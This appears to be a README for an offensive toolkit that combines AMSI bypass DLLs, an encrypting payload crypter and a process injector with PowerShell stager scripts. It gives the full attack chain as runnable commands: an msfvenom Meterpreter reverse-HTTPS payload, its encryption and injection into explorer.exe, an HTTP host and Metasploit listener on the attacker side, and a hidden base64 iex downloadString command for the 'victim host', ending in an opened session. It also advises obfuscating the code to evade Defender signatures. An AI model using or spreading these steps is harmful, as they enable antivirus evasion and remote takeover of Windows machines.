# AMSI Potential Bypasses and Process injector / Payload crypter
Be aware that MS Defender regularly updates signatures, which will invalidate the bypass. Changing/obfuscating variables and recompiling the binary often helps to mitigate future signatures.

## AMSI Bypass programs

## AmsiScanBufferBypass -> ASBBypass
Based on Rasta-Mouse Github repo, using small modifications:
https://github.com/rasta-mouse/AmsiScanBufferBypass

## AmByP -> AmBp
Simpler bypass which might work better due to shortened names/functions.

## Crypter and ProcessInjector -> Rem_proc_inj
Uses a process injector and a encryption/decryption method for attempting to evade detection for payloads.
Based on "Creating AV Resistant Malware" by Brendan Ortiz:
https://blog.securityevaluators.com/creating-av-resistant-malware-part-1-7604b83ea0c0

Supports using payload from an URL or local filesystem.

## Powershell scripts for automating download, injection and execution
In folder "PSScripts", several Powershell stager scripts are added for Template usage and added a few examples.
The examples were created by following the steps starting from "1. Usage AMSI Bypass".
See below for practical usage in section "Automating loading AMSI Bypass and Rem_proc_inj using Powershell scripts"

Basicly, the scripts are split in four parts for loading several stages:
 - b64_encode.ps1: To encode a binary to Powershell base64 to reuse in script stages
 - s1: The Stage 1 loader which will load and execute subsequent Powershell scripts, based on given host
 - s2: The Stage 2 AMSI Bypass script, containing the base64 encoded DLL for ASBBypass as indicated in folder "Examples"
 - s3: The Stage 3 script to run the base64 encoded DLL of Rem_proc_inj, download the encrypted payload from a given host and to decrypt and run it in a given process, using given password

# Manually loading ASBBypass and Rem_proc_inj

Using DLL's
 - Compile projects and use "ASBBypass.dll" OR "AmByp.dll" and "Rem_proc_inj.dll"
 - Use already compiled binaries in folder "Bins"
 
## 1. Usage AMSI Bypass
### C#

Loads the AMSI bypasser.
Can be compiled to a DLL and loaded via reflection, or included in a larger .NET Assembly (e.g. [SharpSploit](https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Evasion/Amsi.cs)).

```
PS > [System.Reflection.Assembly]::LoadFile("X:\ASBBypass.dll")

GAC    Version        Location
---    -------        --------
False  v4.0.30319     X:\ASBBypass.dll

PS > [Amsi]::Bypass()
```
### OR

```
PS X:\payloads> [System.Reflection.Assembly]::LoadFile("X:\AmByp.dll")

GAC    Version        Location
---    -------        --------
False  v4.0.30319     X:\AmByp.dll

PS > [AmBp]::Bpss()
```

```
PS > Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the
 spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
+ ~~~~
    + CategoryInfo          : ObjectNotFound: (AMSI:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

## 2. Usage Crypter and ProcessInjector
### C#

Loads the process injector and payload crypter.
Can be compiled to a DLL and loaded via reflection, or included in a larger .NET Assembly (e.g. [SharpSploit](https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Evasion/Amsi.cs)).

```
PS > [System.Reflection.Assembly]::LoadFile("X:\Rem_proc_inj.dll")

GAC    Version        Location
---    -------        --------
False  v4.0.30319     X:\Rem_proc_inj.dll

PS > [Rem_proc_inj.execute_program]

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     False    execute_program                          System.Object
```

## 3. Create sample payload

Just creating a sample payload to demonstrate.
```
$ msfvenom -p windows/x64/meterpreter/reverse_https lport=443 lhost=192.168.252.5 -f raw -o msftest.bin
```

## 4. Encrypt sample payload file

Encrypt the generated payload and store with a "_enc" suffix, using a given password.
Function parameters: 
```
ex_prog(string password, bool Encrypt, bool Decrypt, string url = "", string localBinPath = "", string outFile = "", string rP = "")
```
Usage:
```
PS > [Rem_proc_inj.execute_program]::ex_prog("SUPERSECRETPASSWORD",$true,$false,"","x:\payloads\msftest.bin","x:\payloads\msftest.bin","")
byte[] sc = new byte[512] { 0x6e, 0x95, 0x8d, 0x24, 0x92, 0xb8, 0x4e, 0x08, 0xf3, 0x24, 0x0c, 0xcd, 0xcc, 0xee, 0x19, 0x62, 0x54, 0x13, 0xe1, 0x2e, 0xf9, 0xd4, 0xec, 0x2d, 0x5d, 0xd6, 0x31, 0x6e, 0xc6, 0xc2, 0x22, 0xd9, 0x09, 0x6a, 0x81, 0x55, 0xd8, 0xdb, 0x14, 0x65, 0x90, 0x71, 0xdb, 0xcc, 0xe0, 0x86, 0x0e, 0x0e, 0xaa, 0xaa, 0xb3, 0xa9, 0x5c, 0xf4, 0x3b, 0x1f, 0x50, 0x6d, 0x01, 0x1d, 0xac, 0xe4, 0x46, 0x0d, 0x22, 0x80, 0x86, 0x2d, 0x95, 0x64, 0x76, 0x6b, 0x60, 0x48, 0x7f, 0x4e, 0x8d, 0xa3, 0x24, 0xc5, 0x81, 0x82, 0x5b, 0x6b, 0xb7, 0x0b, 0x1d, 0x15, 0x4f, 0x8c, 0xc3, 0x0c, 0x8d, 0xc7, 0x59, 0x9f, 0xfc, 0x09, 0x9e, 0x84, 0xb4, 0xa4, 0x72, 0xad, 0xf9, 0x89, 0x25, 0xb0, 0x10, 0xda, 0x3a, 0x27, 0x44, 0x0c, 0x96, 0x53, 0x55, 0xbd, 0x8c, 0x6b, 0x94, 0x82, 0x37, 0x7a, 0x3f, 0x4e, 0x04, 0x53, 0xfe, 0x27, 0x0e, 0x77, 0x30, 0x28, 0xdd, 0x67, 0x94, 0x09, 0x6d, 0x3e, 0x4a, 0x51, 0x87, 0x97, 0x32, 0x0c, 0x86, 0x88, 0xe5, 0x42, 0xaf, 0x03, 0xfa, 0x4a, 0x7b, 0x56, 0xa3, 0xa4, 0xb6, 0x9c, 0x4f, 0x8f, 0xb5, 0xe7, 0xa6, 0x20, 0x1c, 0x36, 0xca, 0x05, 0x4a, 0x8d, 0x28, 0x03, 0x49, 0x39, 0x06, 0x9b, 0xd9, 0xf8, 0x14, 0xad, 0xcc, 0x19, 0x84, 0xcc, 0x6e, 0xed, 0x51, 0x49, 0x48, 0xd1, 0x65, 0x60, 0x91, 0x42, 0xfa, 0x0f, 0x0f, 0x70, 0xca, 0x62, 0x1f, 0xd0, 0x29, 0xe1, 0x44, 0x41, 0x7c, 0xe4, 0x36, 0x84, 0xb4, 0xba, 0x39, 0xbd, 0x19, 0xbb, 0xf0, 0xcb, 0xfb, 0xf3, 0x24, 0x97, 0xf0, 0xa1, 0xf2, 0xc8, 0x60, 0x21, 0x79, 0x0e, 0xf4, 0x34, 0x54, 0xa1, 0x5e, 0xb2, 0x85, 0xdc, 0x92, 0xb1, 0xd8, 0xc9, 0x1d, 0xd1, 0x49, 0x8b, 0x3b, 0x05, 0xc3, 0x2f, 0x27, 0xa0, 0xc8, 0xeb, 0x9a, 0x01, 0x3f, 0xda, 0x13, 0x53, 0x85, 0xa4, 0x3c, 0xa2, 0xa6, 0x63, 0xa5, 0x43, 0x43, 0x1b, 0x8f, 0x55, 0xdc, 0x52, 0xa3, 0x77, 0x1c, 0x43, 0x37, 0x5c, 0xea, 0xf5, 0x9b, 0xe8, 0x1f, 0x91, 0x7f, 0xc9, 0x84, 0xaf, 0x1b, 0xd6, 0x20, 0x78, 0xe1, 0x85, 0x22, 0x11, 0x6d, 0xf7, 0x56, 0xc2, 0x6e, 0xf9, 0x77, 0xec, 0x04, 0x69, 0x1c, 0xf7, 0xc7, 0x30, 0xd9, 0x6a, 0x69, 0xaa, 0x20, 0xa0, 0x6d, 0x80, 0x8e, 0xf7, 0x2f, 0x08, 0x90, 0x8a, 0xf0, 0xb9, 0x2a, 0xb2, 0x91, 0x67, 0x8c, 0xdc, 0xce, 0x32, 0x64, 0x0f, 0x8d, 0x13, 0x1f, 0x2e, 0xa7, 0x12, 0xf0, 0x95, 0xa0, 0x66, 0x43, 0xae, 0x33, 0xb4, 0x9c, 0x5c, 0xcd, 0xef, 0xaa, 0xf1, 0x0d, 0x88, 0x9f, 0xdf, 0xd0, 0xb4, 0x4b, 0xc6, 0x09, 0x39, 0x41, 0xc7, 0xf8, 0x67, 0x99, 0xfb, 0x1a, 0xb6, 0xb9, 0x8e, 0x52, 0x3a, 0xd7, 0xd2, 0xca, 0xe9, 0x58, 0x98, 0x05, 0x1f, 0xc4, 0x0a, 0xbf, 0x13, 0x5b, 0x26, 0x4a, 0xab, 0x51, 0xbb, 0x0b, 0x28, 0x3d, 0xc7, 0x93, 0x5b, 0x33, 0x5a, 0x67, 0x5d, 0xcc, 0xf5, 0xe9, 0x43, 0x80, 0x36, 0x7d, 0x23, 0x6b, 0x26, 0x35, 0xde, 0x0e, 0xff, 0xd3, 0xc7, 0x3f, 0x45, 0xbc, 0x14, 0xe2, 0xdc, 0x89, 0x2e, 0xa6, 0xc4, 0xa5, 0x44, 0xf7, 0xc2, 0x90, 0x3a, 0x6e, 0x4b, 0x53, 0xf2, 0xe2, 0xb4, 0x09, 0xac, 0x77, 0xbc, 0xed, 0xf7, 0xe3, 0xc3, 0xd1, 0x77, 0x9e, 0x22, 0x1a, 0xfb, 0x0b, 0x96, 0x4b, 0x40, 0x74, 0x7e, 0x76, 0x0a, 0x77, 0x78, 0xc2, 0x35, 0x63, 0x32, 0x3f, 0xa1, 0xe3, 0x4b, 0x2d, 0x69, 0xda, 0x87, 0x9c, 0x76, 0x91, 0x3c, 0x52, 0xc4, 0x4f, 0xaf, 0x8d, 0xd0, 0xd6, 0xde, 0x36, 0xac, 0x8c, 0x04, 0x63, 0x26, 0x3d, 0xa8, 0x07, 0x6a, 0xa8, 0xb9, 0xe6, 0x6f, 0x7e, 0xfd };
```

## 4. Decrypt and run sample payload file

Decrypt, inject and run the generated payload, loading from a local filesystem or a remote HTTP host.
Usage: ex_prog(string password, bool Encrypt, bool Decrypt, string url = "", string localBinPath = "", string outFile = "", string rP = "")

```
PS > [Rem_proc_inj.execute_program]::ex_prog("SUPERSECRETPASSWORD",$false,$true,"http://192.168.252.5/msftest.bin_enc","","","explorer")
[*] Injecting & Executing SC of size 510 into process explorer
[*] Memory for injecting shellcode allocated at 0x20250624.
```

# Automating loading AMSI Bypass and Rem_proc_inj using Powershell scripts
Combining above steps into the Powershell templates as used in folder "PSScripts", using the "Templates" version.

## 1. Base64 encode ASBBypass OR AmByP
Base64 encode the ASBBypass binary and insert output into "s2.ps1"
```
PS > Import-Module .\b64_encode.ps1
PS > toBase64 X:\ASBBypass.dll
<SNIPPED_FOR_BREVITY>

PS > toBase64 X:\AmByp.dll
<SNIPPED_FOR_BREVITY>
```

## 2. Base64 encode Rem_proc_inj
Base64 encode the Rem_proc_inj binary and insert output into "s3.ps1".
```
PS > toBase64 X:\Rem_proc_inj.dll
<SNIPPED_FOR_BREVITY>
```

## 3. Setup listeners
Change the hosts and ports in scripts "s1.ps1" and "s2.ps1".

### Setup HTTP listener on attacking host
```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

### Setup MSF or any other payload listener on attacking host
```
$ sudo msfconsole -n -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.252.5; set lport 443; run -j"
```

## 4. Run initial loader script on victim host

### Powershell command on victim host
```
iex(new-object net.webclient).downloadString('http://192.168.252.5/s1.ps1')

```

### Optionally convert to Base64 LE on attacking host
```
$ echo -n "iex(new-object net.webclient).downloadString('http://192.168.252.5/s1.ps1')" > /tmp/payl.txt
$ iconv -f ASCII -t UTF-16LE /tmp/payl.txt | base64 | tr -d "\n"
aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADUAMgAuADUALwBzADEALgBwAHMAMQAnACkA
```

### Final Powershell command to execute on victim host
```
PS > powershell.exe -ep bypass -nol -noni -w hidden -nop -e aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADUAMgAuADUALwBzADEALgBwAHMAMQAnACkA
```

## 5. Receive response on attacking host
```
msf6 exploit(multi/handler) > [*] Sending stage (200262 bytes) to 192.168.252.8
[*] Meterpreter session 1 opened (192.168.252.5:443 -> 192.168.252.8:2095) at 2021-02-05 12:06:19 +0100

msf6 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-8DCK0D8\vbox
```


